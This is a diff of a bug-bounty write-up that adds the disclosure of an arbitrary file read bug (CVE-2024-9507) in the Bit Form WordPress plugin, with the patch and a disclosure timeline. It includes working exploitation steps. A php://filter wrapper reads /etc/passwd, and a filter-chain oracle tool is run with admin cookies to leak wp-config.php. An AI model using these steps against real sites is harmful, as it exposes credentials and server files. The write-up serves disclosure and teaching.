@@ -7,10 +7,12 @@
 - [Authenticated (Administrator+) Arbitrary File Upload (CVE-2024-6123)](#authenticated-administrator-arbitrary-file-upload-cve-2024-6123)  
     - [The Patch](#the-patch)  
     - [Timeline](#timeline)  
-- [Redacted](#redacted-cve-2024-)  
-- [Authenticated (Administrator+) Arbitrary File Deletion (CVE-2024-7782)](#authenticated-administrator-arbitrary-file-deletion-cve-2024-7782)  
+- [Authenticated (Administrator+) Improper Input Validation via iconUpload Function to Arbitrary File Read (CVE-2024-9507)](#authenticated-administrator-improper-input-validation-via-icon-upload-function-to-arbitrary-file-read-cve-2024-9507)  
     - [The Patch](#the-patch-1)  
     - [Timeline](#timeline-1)  
+- [Authenticated (Administrator+) Arbitrary File Deletion (CVE-2024-7782)](#authenticated-administrator-arbitrary-file-deletion-cve-2024-7782)  
+    - [The Patch](#the-patch-2)  
+    - [Timeline](#timeline-2)  
 - [Authenticated (Administrator+) Arbitrary File Read And Deletion (CVE-2024-7777)](#authenticated-administrator-arbitrary-file-read-and-deletion-cve-2024-7777)  
     - [Arbitrary File Deletion](#arbitrary-file-deletion)  
         - [Arbitrary File Deletion via Method `deleteBlukFormEntries`](#arbitrary-file-deletion-via-method-deleteblukformentries)  
@@ -18,17 +20,17 @@
         - [Arbitrary File Deletion via Method `deleteAForm`](#arbitrary-file-deletion-via-method-deleteaform)  
     - [Arbitrary File Read](#arbitrary-file-read)  
         - [Arbitrary File Read Bypass via Arbitrary File Deletion](#arbitrary-file-read-bypass-via-arbitrary-file-deletion)  
-    - [The Patch](#the-patch-2)  
-    - [Timeline](#timeline-2)  
-- [Authenticated (Administrator+) SQL Injection (CVE-2024-7780)](#authenticated-administrator-sql-injection-cve-2024-7780)  
     - [The Patch](#the-patch-3)  
     - [Timeline](#timeline-3)  
-- [Authenticated (Administrator+) SQL Injection via getLogHistory Function (CVE-2024-7702)](#authenticated-administrator-sql-injection-via-getloghistory-function-cve-2024-7702)  
+- [Authenticated (Administrator+) SQL Injection (CVE-2024-7780)](#authenticated-administrator-sql-injection-cve-2024-7780)  
     - [The Patch](#the-patch-4)  
     - [Timeline](#timeline-4)  
-- [Authenticated (Administrator+) Arbitrary JavaScript File Uploads (CVE-2024-7775)](#authenticated-administrator-arbitrary-javascript-file-uploads-cve-2024-7775)  
+- [Authenticated (Administrator+) SQL Injection via getLogHistory Function (CVE-2024-7702)](#authenticated-administrator-sql-injection-via-getloghistory-function-cve-2024-7702)  
     - [The Patch](#the-patch-5)  
     - [Timeline](#timeline-5)  
+- [Authenticated (Administrator+) Arbitrary JavaScript File Uploads (CVE-2024-7775)](#authenticated-administrator-arbitrary-javascript-file-uploads-cve-2024-7775)  
+    - [The Patch](#the-patch-6)  
+    - [Timeline](#timeline-6)  
 - [Conclusion](#conclusion)  
 
 </details>
@@ -39,7 +41,7 @@ This writeup is about how I found my first real world vulnerabilities across 6 d
 
 In this first part, I'll talk about how I found the following vulnerabilities in details:
 1. \*[Authenticated (Administrator+) Arbitrary File Upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/bit-form/bit-form-2122-authenticated-administrator-arbitrary-file-upload) ([CVE-2024-6123](https://www.cve.org/CVERecord?id=CVE-2024-6123))
-2. Redacted (CVE-2024-????) (Waiting for public disclosure)
+2. [Authenticated (Administrator+) Improper Input Validation via iconUpload Function to Arbitrary File Read](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/bit-form/contact-form-by-bit-form-multi-step-form-calculation-contact-form-payment-contact-form-custom-contact-form-builder-2152-authenticated-administrator-improper-input-validation-via-iconupload-function-to-arbitrary-file-read) ([CVE-2024-9507](https://www.cve.org/CVERecord?id=CVE-2024-9507))
 3. [Authenticated (Administrator+) Arbitrary File Deletion](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/bit-form/contact-form-by-bit-form-multi-step-form-calculation-contact-form-payment-contact-form-custom-contact-form-builder-20-2134-authenticater-administrator-arbitrary-file-deletion) ([CVE-2024-7782](https://www.cve.org/CVERecord?id=CVE-2024-7782))
 4. [Authenticated (Administrator+) Arbitrary File Read And Deletion](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/bit-form/contact-form-by-bit-form-multi-step-form-calculation-contact-form-payment-contact-form-custom-contact-form-builder-20-2139-authenticated-administrator-arbitrary-file-read-and-deletion) ([CVE-2024-7777](https://www.cve.org/CVERecord?id=CVE-2024-7777))
 5. [Authenticated (Administrator+) SQL Injection](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/bit-form/contact-form-by-bit-form-multi-step-form-calculation-contact-form-payment-contact-form-custom-contact-form-builder-20-2139-authenticated-administrator-sql-injection) ([CVE-2024-7780](https://www.cve.org/CVERecord?id=CVE-2024-7780))
@@ -278,9 +280,106 @@ class AdminAjax
 - Wordfence publicly disclosed the vulnerability in July 8th, 2024
 - Bit Form version 2.13.4 was released in July 9th, 2024
 
-## Redacted (CVE-2024-????)
+## Authenticated (Administrator+) Improper Input Validation via iconUpload Function to Arbitrary File Read (CVE-2024-9507)
 
-I found another vulnerability during writing this writeup. I'll update this section once it's publicly disclosed.
+During writing this writeup, I realized that method `iconUpload` is actually vulnerable to arbitrary file read. More specifically, it's the following line:
+
+```php
+class AdminAjax
+{
+  [...]
+  public function iconUpload()
+  {
+    [...]
+    $imageUrlData = file_get_contents($input->src);
+```
+
+Did you spot the vulnerability in here? :D
+
+If you played CTF long enough and solved tons of web challenges, you should know that PHP has something called "wrapper".
+
+If there's a PHP built-in function that reads a file, such as `file_get_contents`, and has no validation in the filename, we can use PHP wrapper to read arbitrary files or even RCE (Remote Code Execution).
+
+In one of many PHP wrappers, we can use `php://filter` to perform basic modification operations on the data before being it's read or written. For example, we can base64 encode the contents of `/etc/passwd`:
+
+```php
+echo file_get_contents("php://filter/convert.base64-encode/resource=file:///etc/passwd");
+```
+
+```shell
+┌[siunam♥Mercury]-(~/bug-bounty/Wordfence/PoC/bit-form/file-read)-[2024.08.21|23:04:25(HKT)]
+└> php -a                       
+[...]
+php > echo file_get_contents("php://filter/convert.base64-encode/resource=file:///etc/passwd");
+cm9vdDp4OjA6MDpyb290Oi9yb290[...]
+```
+
+Now you might be saying: Let's use this PHP wrapper to read arbitrary files!
+
+Well, nope. You can't read the contents of the file. This is because the file validation will NOT pass.
+
+> Note: Before version 2.13.4, we can read the contents of the file, because there's no file validation.
+
+In [0xL4ugh CTF 2024](https://ctftime.org/event/2216), I solved a web challenge called "Ghazy Corp" (Writeup [here](https://siunam321.github.io/ctf/0xL4ugh-CTF-2024/Web/Ghazy-Corp/)). The solution of this challenge is to use **PHP filter chain to leak the file contents via error-based oracle**.
+
+For more details about this technique, I strongly recommend you to read this blog post by Synacktiv: "[PHP filter chains: file read from error-based oracle](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle)".
+
+In their blog post, Synacktiv also developed a tool to automate the exploitation, which can be found at this GitHub repository: [https://github.com/synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).
+
+Let's download that tool!
+
+```shell
+┌[siunam♥Mercury]-(/opt)-[2024.08.21|23:33:39(HKT)]
+└> git clone https://github.com/synacktiv/php_filter_chains_oracle_exploit.git
+[...]
+┌[siunam♥Mercury]-(/opt)-[2024.08.21|23:33:42(HKT)]
+└> cd php_filter_chains_oracle_exploit  
+```
+
+After that, we can run the tool with the following arguments:
+
+```shell
+┌[siunam♥Mercury]-(/opt/php_filter_chains_oracle_exploit)-[2024.08.21|23:34:01(HKT)]-[git://main ✔]
+└> python3 filters_chain_oracle_exploit.py --target 'http://localhost/wp-admin/admin-ajax.php?action=bitforms_icn_save_setting&_ajax_nonce=7c14a2c9d5' --file '/var/www/html/wp-config.php' --parameter 'src' --headers '{"Cookie":"wordpress_86a9106ae65537651a8e456835b316ab=wordpress%7C1724424200%7C8f5DffgMa2AgY0yHu5EHCtd85HC9isw6wSaUek2PNYQ%7C92130fb11ce849391025a7643e2dbadf0cbe5db86d2a6f0f6d777f32ef48979a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=wordpress%7C1724424200%7C8f5DffgMa2AgY0yHu5EHCtd85HC9isw6wSaUek2PNYQ%7C4aa1c62128cd84c74d39d58b8e003f84e3ed72b9c27be1724b13d6e02b195800"}' --json=1
+[*] The following URL is targeted : http://localhost/wp-admin/admin-ajax.php?action=bitforms_icn_save_setting&_ajax_nonce=7c14a2c9d5
+[*] The following local file is leaked : /var/www/html/wp-config.php
+[*] Running POST requests
+[*] Additionnal headers used : {"Cookie":"wordpress_86a9106ae65537651a8e456835b316ab=wordpress%7C1724424200%7C8f5DffgMa2AgY0yHu5EHCtd85HC9isw6wSaUek2PNYQ%7C92130fb11ce849391025a7643e2dbadf0cbe5db86d2a6f0f6d777f32ef48979a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=wordpress%7C1724424200%7C8f5DffgMa2AgY0yHu5EHCtd85HC9isw6wSaUek2PNYQ%7C4aa1c62128cd84c74d39d58b8e003f84e3ed72b9c27be1724b13d6e02b195800"}
+PD9waHANCi8qKg0KICogVGh
+b'<?php\r\n/**\r\n * Th'
+```
+
+**Video showcase:**
+
+![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/file_read_via_php_filter_chains.mp4)
+
+Nice! We found an arbitrary file read vulnerability! Let's report this!
+
+### The Patch
+
+Again, the fix is very simple, just validate the `src` JSON value to be a legit URL, such as not allowing the URL uses a PHP wrapper as the protocol.
+
+We can see that version 2.15.3 [revision log](https://plugins.trac.wordpress.org/changeset/3165686/bit-form/trunk/includes/Admin/AdminAjax.php) uses **WordPress function [`sanitize_url`](https://developer.wordpress.org/reference/functions/sanitize_url/)** to accept a list of allowed protocols:
+
+```php
+class AdminAjax
+{
+  [...]
+  public function iconUpload()
+  {
+    [...]
+    $sanitize_url = sanitize_url($input->src);
+    [...]
+    $imageUrlData = file_get_contents($sanitize_url);
+```
+
+### Timeline
+
+- Reported the vulnerability to Wordfence in August 21st, 2024 at 10:57 PM
+- Wordfence started the triage process in October 4th, 2024 at 6:58 AM (UTC+8)
+- Wordfence assigned CVE ID "CVE-2024-9507" in October 4th, 2024 at 7:13 AM (UTC+8)
+- Bit Form version 2.15.3 was released in October 9th, 2024
+- Wordfence publicly disclosed the vulnerability in October 11st, 2024 at 3:16 AM (UTC+8)
 
 ## Authenticated (Administrator+) Arbitrary File Deletion (CVE-2024-7782)
 
